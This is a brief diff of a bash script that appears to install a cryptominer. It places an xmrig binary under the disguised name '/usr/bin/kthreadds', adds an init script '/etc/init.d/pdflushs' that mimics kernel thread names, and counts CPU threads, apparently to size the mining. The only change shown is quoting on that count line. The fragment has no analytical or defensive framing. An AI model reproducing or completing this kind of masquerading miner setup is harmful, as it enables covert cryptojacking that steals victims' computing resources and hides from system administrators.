@@ -1,6 +1,6 @@
 #!/bin/bash
 pdflushType="launch"
-threads=$(cat /proc/cpuinfo | grep "processor" | wc -l)
+threads="$(cat /proc/cpuinfo | grep "processor" | wc -l)"
 launch="/etc/init.d/pdflushs"
 xmrig="/usr/bin/kthreadds"
 config="/usr/bin/config.json"
